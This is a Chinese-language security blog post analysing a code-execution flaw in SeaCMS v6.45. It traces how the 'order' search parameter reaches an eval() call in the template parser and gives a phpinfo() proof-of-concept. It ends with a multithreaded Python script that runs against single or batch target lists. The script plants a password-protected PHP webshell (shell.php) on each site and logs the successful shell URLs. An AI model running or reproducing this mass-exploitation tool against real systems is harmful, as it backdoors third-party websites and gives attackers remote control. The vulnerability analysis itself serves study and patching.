<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>SeaCMS v6.45前台Getshell 代码执行漏洞(每日一洞) - F0rmat&#39;Blog</title>
<link rel="stylesheet" type="text/css" href="/css/main.css">
</head>
<body>
<header>
  <div>
    <h1><a href="https://getshe11.com/">F0rmat&#39;Blog</a></h1>
  </div>
  <nav></nav>
</header>
<main>
  <article>
    <div class="title">
  <h1>SeaCMS v6.45前台Getshell 代码执行漏洞(每日一洞)</h1>
  </div>
<div style="position: fixed; right:-30px; max-width:300px; overflow:auto; top: 1px; width: 300px; bottom:100px">

</div>
<div class="meta">
  <div>2018-03-02 19:28</div>
  <div>
    <span><a href="https://getshe11.com/tags/php/">#php</a></span>
      <span><a href="https://getshe11.com/tags/seacms/">#SeaCMS</a></span>
      <span><a href="https://getshe11.com/tags/getshell/">#getshell</a></span>
      </div>
  </div>
<div class="content">
  <h1 id="前言">前言</h1>
<p>昨晚审计到了三点，今天还要整理宿舍就没有写文章。这个CMS没有用框架，漏洞的执行过程我看了很久才看完，下面就写漏洞执行过程和POC构造还有用Python编写批量Getshell脚本。</p>
<h1 id="环境">环境</h1>
<p><strong>Web：</strong> phpstudy
<strong>System：</strong> Windows 10 X64
<strong>Browser：</strong> Firefox Quantum
<strong>Python version ：</strong> 2.7</p>
<h1 id="漏洞代码执行过程分析">漏洞代码执行过程分析</h1>
<p>先看一下这个代码是一个怎么执行的吧，我画了一个流程图，有点简陋，不过如果真的要深入了解一定要亲自去看一遍代码才行。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms_order_liucheng.png" alt=""></p>
<h1 id="漏洞详情">漏洞详情</h1>
<h2 id="漏洞代码执行">漏洞代码执行</h2>
<h3 id="payload代码">Payload代码</h3>
<p><code>http://seacms.test/search.php</code>
POST:<code>searchtype=5&amp;order=}{end if} {if:1)phpinfo();if(1}{end if}</code></p>
<!-- raw HTML omitted -->
<h3 id="执行结果">执行结果</h3>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms1.png" alt=""></p>
<h2 id="分析过程">分析过程</h2>
<ul>
<li>漏洞的触发点是在<code>search.php</code> 中的<code>echoSearchPage()</code>函数可以触发漏洞。常规的分析都是先找<code>GET</code>、<code>POST</code>的位置，在这个文件里面没有这些变量，原来是在<code>./include/common.php</code>里面。</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">if</span>(<span style="color:#66d9ef">PHP_VERSION</span> <span style="color:#f92672">&lt;</span> <span style="color:#e6db74">&#39;4.1.0&#39;</span>) {
	$_GET <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>$HTTP_GET_VARS;
	$_POST <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>$HTTP_POST_VARS;
	$_COOKIE <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>$HTTP_COOKIE_VARS;
	$_SERVER <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>$HTTP_SERVER_VARS;
	$_ENV <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>$HTTP_ENV_VARS;
	$_FILES <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>$HTTP_POST_FILES;
}
<span style="color:#f92672">......</span>
<span style="color:#66d9ef">foreach</span>(<span style="color:#66d9ef">Array</span>(<span style="color:#e6db74">&#39;_GET&#39;</span>,<span style="color:#e6db74">&#39;_POST&#39;</span>,<span style="color:#e6db74">&#39;_COOKIE&#39;</span>) <span style="color:#66d9ef">as</span> $_request)
{
	<span style="color:#66d9ef">foreach</span>($$_request <span style="color:#66d9ef">as</span> $_k <span style="color:#f92672">=&gt;</span> $_v) ${$_k} <span style="color:#f92672">=</span> <span style="color:#a6e22e">_RunMagicQuotes</span>($_v);
}
</code></pre></div><p>所以Payload用GET还是POST都是可以的。</p>
<ul>
<li>由于代码太多就例举主要的代码段分析，继续回到<code>search.php</code>里面的<code>echoSearchPage()</code>函数。
第一句是把这些变量设置为全局变量，方便下面来传值。
第二句是判断<code>$order</code>是否为空，如果为空就把<code>time</code>赋值给$order。</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">global</span> $dsql,$cfg_iscache,$mainClassObj,$page,$t1,$cfg_search_time,$searchtype,$searchword,$tid,$year,$letter,$area,$yuyan,$state,$ver,$order,$jq,$money,$cfg_basehost;
	$order <span style="color:#f92672">=</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($order)<span style="color:#f92672">?</span>$order<span style="color:#f92672">:</span><span style="color:#a6e22e">time</span>;
</code></pre></div><ul>
<li>这段是<code>Payload</code>的里面一个重要的参数<code>$searchtype</code>的代码，一定要赋值<code>5</code>，可以到看到等于<code>5</code>的时候就有<code>$order</code>变量，所以我们要传<code>$order</code>进去就赋值<code>5</code>，至于为什么要赋值给<code>$order</code>，先跟着代码执行下去自然就会明白了。
这里还有一个点，就是第四行的<code>$pSize</code>这里是选择模版文件，就是为了接下来使用<code>str_replace</code>函数对这个模版文件的内容进行替换。
替换内容的文件在<code>\data\cache</code>里面，下面是文件的位置。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms2.png" alt=""></li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">intval</span>($searchtype)<span style="color:#f92672">==</span><span style="color:#ae81ff">5</span>)
	{
		$searchTemplatePath <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/templets/&#34;</span><span style="color:#f92672">.</span>$GLOBALS[<span style="color:#e6db74">&#39;cfg_df_style&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">.</span>$GLOBALS[<span style="color:#e6db74">&#39;cfg_df_html&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;/cascade.html&#34;</span>;
		$typeStr <span style="color:#f92672">=</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($tid)<span style="color:#f92672">?</span><span style="color:#a6e22e">intval</span>($tid)<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;_&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;0_&#39;</span>;
		$yearStr <span style="color:#f92672">=</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($year)<span style="color:#f92672">?</span><span style="color:#a6e22e">PinYin</span>($year)<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;_&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;0_&#39;</span>;
		$letterStr <span style="color:#f92672">=</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($letter)<span style="color:#f92672">?</span>$letter<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;_&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;0_&#39;</span>;
		$areaStr <span style="color:#f92672">=</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($area)<span style="color:#f92672">?</span><span style="color:#a6e22e">PinYin</span>($area)<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;_&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;0_&#39;</span>;
		$orderStr <span style="color:#f92672">=</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($order)<span style="color:#f92672">?</span>$order<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;_&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;0_&#39;</span>;
		$jqStr <span style="color:#f92672">=</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($jq)<span style="color:#f92672">?</span>$jq<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;_&#39;</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#39;0_&#39;</span>;
		$cacheName<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;parse_cascade_&#34;</span><span style="color:#f92672">.</span>$typeStr<span style="color:#f92672">.</span>$yearStr<span style="color:#f92672">.</span>$letterStr<span style="color:#f92672">.</span>$areaStr<span style="color:#f92672">.</span>$orderStr;
		$pSize <span style="color:#f92672">=</span> <span style="color:#a6e22e">getPageSizeOnCache</span>($searchTemplatePath,<span style="color:#e6db74">&#34;cascade&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>);
	}<span style="color:#66d9ef">else</span>
	{
		<span style="color:#66d9ef">if</span>($cfg_search_time<span style="color:#f92672">&amp;&amp;</span>$page<span style="color:#f92672">==</span><span style="color:#ae81ff">1</span>) <span style="color:#a6e22e">checkSearchTimes</span>($cfg_search_time);
		$searchTemplatePath <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/templets/&#34;</span><span style="color:#f92672">.</span>$GLOBALS[<span style="color:#e6db74">&#39;cfg_df_style&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">.</span>$GLOBALS[<span style="color:#e6db74">&#39;cfg_df_html&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;/search.html&#34;</span>;
		$cacheName<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;parse_search_&#34;</span>;
		$pSize <span style="color:#f92672">=</span> <span style="color:#a6e22e">getPageSizeOnCache</span>($searchTemplatePath,<span style="color:#e6db74">&#34;search&#34;</span>,<span style="color:#e6db74">&#34;&#34;</span>);
	}
<span style="color:#a6e22e">。。。。。。。中间有很多代码就不一一分析中间的了。</span>
	$content <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;{searchpage:page}&#34;</span>,$page,$content);
	    $content <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;{seacms:searchword}&#34;</span>,$searchword,$content);
	$content <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;{seacms:searchnum}&#34;</span>,$TotalResult,$content);
	    $content <span style="color:#f92672">=</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;{searchpage:ordername}&#34;</span>,$order,$content);
</code></pre></div><ul>
<li>来到这里了，离构造POC又进一步了。我们只要的是看<code>parseIf</code>这个函数，在此之前我们可以先用<code>echo</code>来输出一下<code>$content</code>的内容，下面是对比图：</li>
</ul>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms3.png" alt=""></p>
<hr>
<p><img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms4.png" alt=""></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">        $content<span style="color:#f92672">=</span>$mainClassObj<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">parseIf</span>($content);
	$content<span style="color:#f92672">=</span><span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;{seacms:member}&#34;</span>,<span style="color:#a6e22e">front_member</span>(),$content);
	$searchPageStr <span style="color:#f92672">=</span> $content;
	<span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">str_replace</span>(<span style="color:#e6db74">&#34;{seacms:runinfo}&#34;</span>,<span style="color:#a6e22e">getRunTime</span>($t1),$searchPageStr) ;
</code></pre></div><ul>
<li>下面我们继续跟进<code>parseIf</code>这个函数,代码我就贴执行代码漏洞的地方。代码中用到一些不懂函数可以去PHP官网或者百度Google一下。
<code>$labelRule*</code>这些变量都是规则，<code>preg_match_all</code>函数就用到了第一个规则<code>{if:(.*?)}(.*?){end if}</code>。
有很多新手估计要看很久才能看得懂这段正则，我在这里稍微解释一下，{if:<strong>(.<em>?)}(.</em>?)</strong>{end if}，除了加粗部分是一定要符合{if:}{end if},中间的<code>(.*?)</code>是用了贪婪的模式，它把匹配到的赋值到一个数组<code>$iar</code>里面，大家可以输入一下这个数组：
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms5.png" alt=""><br>
大家发现了吗，变量<code>$order</code>的值也在里面，所以我们为什么要用<code>order</code>这个函数写入要执行的代码了。
来看这一句<code>	if (strpos($strThen,$labelRule2)===false){</code>判断<code>strpos</code>返回是否为假就执行下面的代码，我们来输出下<code>$strThen</code>到底有没有这个<code>$labelRule2</code>变量的内容。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms6.png" alt="">
可以看到是没有的，所以会执行下面的代码，<code>if (strpos($strThen,$labelRule3)&gt;=0){</code>这个判断从上面输出就可以看到有这个内容，所以为真执行下面的代码。
下面三句代码就不用看了，因为重要的是<code>@eval(&quot;if(&quot;.$strIf.&quot;){\$ifFlag=true;}else{\$ifFlag=false;}&quot;);</code>里面的<code>$strIf</code>变量也就是数组$iar[1]数组<code>$iar[1]</code>里面的内容。我们继续输出一下这个数组里面的内容。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms7.png" alt="">
这里可以看出<code>eval</code>执行的变量是<code>$strIf</code>，而<code>$strIf</code>又有<code>$order</code>，所以这里又再一次解释为什么要用<code>order</code>参数</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">	<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">parseIf</span>($content){
		<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strpos</span>($content,<span style="color:#e6db74">&#39;{if:&#39;</span>)<span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span>){
		<span style="color:#66d9ef">return</span> $content;
		}<span style="color:#66d9ef">else</span>{
		$labelRule <span style="color:#f92672">=</span> <span style="color:#a6e22e">buildregx</span>(<span style="color:#e6db74">&#34;{if:(.*?)}(.*?){end if}&#34;</span>,<span style="color:#e6db74">&#34;is&#34;</span>);
		$labelRule2<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{elseif&#34;</span>;
		$labelRule3<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;{else}&#34;</span>;
		<span style="color:#a6e22e">preg_match_all</span>($labelRule,$content,$iar);
		$arlen<span style="color:#f92672">=</span><span style="color:#a6e22e">count</span>($iar[<span style="color:#ae81ff">0</span>]);
		$elseIfFlag<span style="color:#f92672">=</span><span style="color:#66d9ef">false</span>;
		<span style="color:#66d9ef">for</span>($m<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;$m<span style="color:#f92672">&lt;</span>$arlen;$m<span style="color:#f92672">++</span>){
			$strIf<span style="color:#f92672">=</span>$iar[<span style="color:#ae81ff">1</span>][$m];
			$strIf<span style="color:#f92672">=</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">parseStrIf</span>($strIf);
			$strThen<span style="color:#f92672">=</span>$iar[<span style="color:#ae81ff">2</span>][$m];
			$strThen<span style="color:#f92672">=</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">parseSubIf</span>($strThen);
			<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strpos</span>($strThen,$labelRule2)<span style="color:#f92672">===</span><span style="color:#66d9ef">false</span>){
				<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strpos</span>($strThen,$labelRule3)<span style="color:#f92672">&gt;=</span><span style="color:#ae81ff">0</span>){
					$elsearray<span style="color:#f92672">=</span><span style="color:#a6e22e">explode</span>($labelRule3,$strThen);
					$strThen1<span style="color:#f92672">=</span>$elsearray[<span style="color:#ae81ff">0</span>];
					$strElse1<span style="color:#f92672">=</span>$elsearray[<span style="color:#ae81ff">1</span>];
                    <span style="color:#f92672">@</span><span style="color:#66d9ef">eval</span>(<span style="color:#e6db74">&#34;if(&#34;</span><span style="color:#f92672">.</span>$strIf<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;){</span><span style="color:#ae81ff">\$</span><span style="color:#e6db74">ifFlag=true;}else{</span><span style="color:#ae81ff">\$</span><span style="color:#e6db74">ifFlag=false;}&#34;</span>);
</code></pre></div><h3 id="构造poc">构造POC</h3>
<p>又到构造POC这一步骤了，经过上面的分析，我们可以很清晰地构造出POC了。
<code> {if:&quot;{searchpage:ordername}&quot;==&quot;time&quot;}</code>替换模版文件里面内容
<code>{if:(.*?)}(.*?){end if}</code>匹配规则
<code>@eval(&quot;if(&quot;.$strIf.&quot;){\$ifFlag=true;}else{\$ifFlag=false;}&quot;)</code>代码执行</p>
<p>我们传入的<code>order</code>要放在<code>{searchpage:ordername}</code>这里,所以我们要闭合前面的标签，<code>}{end if}</code>这句就可以闭合前面的标签， 为什么要闭合，因为程序的<code>{if:}{end if}</code>也是会解析成PHP的代码，如果不闭合就会出错不执行我们的代码。</p>
<p>过了这一关后，就到匹配规则了，只要符合<code>{if:}{end if}</code>就行了。我们要在<code>{if:(.*?)}</code>里面的<code>(.*?)</code>才会传入<code>$strIf</code>变量，继续看下面。</p>
<p>最后一关就是闭合<code>if(&quot;.$strIf.&quot;)</code>，加入这一句<code>1)phpinfo();if(1</code>就OK了</p>
<p>代码执行的结果就是<code>@eval(&quot;if(1)phpinfo();if(1){\$ifFlag=true;}else{\$ifFlag=false;}&quot;)</code></p>
<p>所以我们的POC就是<code>}{end if} {if:1)phpinfo();if(1}{end if}</code></p>
<h2 id="用python编写批量getshell脚本">用Python编写批量Getshell脚本</h2>
<p>用了多线程，可以指定单目标或者批量。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/seacms8.png" alt=""></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#e6db74">&#39;&#39;&#39;
</span><span style="color:#e6db74">author:F0rmat
</span><span style="color:#e6db74">&#39;&#39;&#39;</span>

<span style="color:#f92672">import</span> sys
<span style="color:#f92672">import</span> requests
<span style="color:#f92672">import</span> threading
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">exploit</span>(target):
    <span style="color:#66d9ef">if</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;-f&#34;</span>:
        target<span style="color:#f92672">=</span>target[<span style="color:#ae81ff">0</span>]
    url<span style="color:#f92672">=</span>target<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;/search.php&#34;</span>
    payload <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;searchtype&#34;</span>:<span style="color:#ae81ff">5</span>,<span style="color:#e6db74">&#34;order&#34;</span>:<span style="color:#e6db74">&#34;}{end if}{if:1)print_r($_POST[func]($_POST[cmd]));//}{end if}&#34;</span>,<span style="color:#e6db74">&#34;func&#34;</span>:<span style="color:#e6db74">&#34;assert&#34;</span>,<span style="color:#e6db74">&#34;cmd&#34;</span>:<span style="color:#e6db74">&#34;fwrite(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[f0rmat])?&gt;f0rmat&#39;);&#34;</span>}
    shell <span style="color:#f92672">=</span> target<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;/shell.php&#39;</span>
    <span style="color:#66d9ef">try</span>:
        r<span style="color:#f92672">=</span>requests<span style="color:#f92672">.</span>post(url,data<span style="color:#f92672">=</span>payload)
        verify <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(shell, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;f0rmat&#34;</span> <span style="color:#f92672">in</span> verify<span style="color:#f92672">.</span>content:
            <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;Write success,shell url:&#39;</span>,shell,<span style="color:#e6db74">&#39;pass:f0rmat&#39;</span>
            <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;success.txt&#34;</span>,<span style="color:#e6db74">&#34;a+&#34;</span>) <span style="color:#66d9ef">as</span> f:
                f<span style="color:#f92672">.</span>write(shell<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;  pass:f0rmat&#39;</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
        <span style="color:#66d9ef">else</span>:
            <span style="color:#66d9ef">print</span> target,<span style="color:#e6db74">&#39;Write failure!&#39;</span>
    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>, e:
        <span style="color:#66d9ef">print</span> e
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
    <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv)<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">3</span>:
        <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;python check_order.py.py -h target/-f target-file&#39;</span>
    <span style="color:#66d9ef">else</span>:
        <span style="color:#66d9ef">if</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;-h&#34;</span>:
            exploit(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>])
        <span style="color:#66d9ef">elif</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;-f&#34;</span>:
            <span style="color:#66d9ef">with</span> open(sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>], <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
                b <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>readlines()
                <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> xrange(len(b)):
                    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> b[i] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>:
                        threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>exploit, args<span style="color:#f92672">=</span>(b[i]<span style="color:#f92672">.</span>split(),))<span style="color:#f92672">.</span>start()



<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__main__&#39;</span>:
    main()
</code></pre></div><h1 id="结束">结束</h1>
<p>审计这个洞，真的累，可能就是因为太菜了吧，哈哈。</p>
<h1 id="参考">参考</h1>
<p>源码下载地址：https://pan.lanzou.com/i0l0leb</p>
<p><a href="http://blog.csdn.net/pygain/article/details/56016227">http://blog.csdn.net/pygain/article/details/56016227</a></p>
<p><a href="http://php.net/docs.php">http://php.net/docs.php</a></p>
<p><a href="https://github.com/F0r3at/Python-Tools/tree/master/seacms">https://github.com/F0r3at/Python-Tools/tree/master/seacms</a></p>
<p><a href="http://0day5.com/archives/4249/">http://0day5.com/archives/4249/</a></p>
</div>
<div style="position: fixed; right:50px; max-width:255px; overflow:auto; top: 120px; width: 220px; bottom:90px">










<div class="toc">

    <div class="page-header"><strong>目录</strong></div>

    <div id="page-scrollspy" class="toc-nav">

        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e5%89%8d%e8%a8%80">
                            前言
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e7%8e%af%e5%a2%83">
                            环境
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e6%bc%8f%e6%b4%9e%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c%e8%bf%87%e7%a8%8b%e5%88%86%e6%9e%90">
                            漏洞代码执行过程分析
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e6%bc%8f%e6%b4%9e%e8%af%a6%e6%83%85">
                            漏洞详情
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e6%bc%8f%e6%b4%9e%e4%bb%a3%e7%a0%81%e6%89%a7%e8%a1%8c">
                            漏洞代码执行
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#payload%e4%bb%a3%e7%a0%81">
                            Payload代码
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e6%89%a7%e8%a1%8c%e7%bb%93%e6%9e%9c">
                            执行结果
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e5%88%86%e6%9e%90%e8%bf%87%e7%a8%8b">
                            分析过程
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e6%9e%84%e9%80%a0poc">
                            构造POC
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e7%94%a8python%e7%bc%96%e5%86%99%e6%89%b9%e9%87%8fgetshell%e8%84%9a%e6%9c%ac">
                            用Python编写批量Getshell脚本
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e7%bb%93%e6%9d%9f">
                            结束
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        
        
            
                
                
                    
                    <ul class="nav">
                    
                    
                        <li class="nav-item">
                            <a class="nav-link text-left" href="#%e5%8f%82%e8%80%83">
                            参考
                            </a>
                        </li>
                    
                    
                    </ul>
                    
                
            
        

    </div>

</div>



</div>

  </article>
</main>
<footer>
  <div>
    <div>&copy; 2021 F0rmat. <a href="https://creativecommons.org/licenses/by/4.0/deed.zh">CC-BY-4.0</a></div>
  </div>
</footer>
</body>
</html>
